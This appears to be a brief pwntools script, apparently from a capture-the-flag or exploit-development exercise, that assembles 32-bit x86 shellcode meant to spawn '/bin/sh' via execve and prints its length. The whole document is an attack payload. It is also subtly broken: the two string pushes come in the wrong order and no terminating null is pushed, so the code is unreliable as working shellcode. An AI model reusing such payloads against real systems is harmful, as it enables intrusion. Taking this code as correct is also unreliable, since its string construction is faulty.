
from pwn import *

shellcode=asm(
    '''
    push 0x6E69622F
    push 0x68732F2F
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx
    mov eax,0xb
    mov ebx,esp
    int 0x80
    '''
    )

print(len(shellcode))
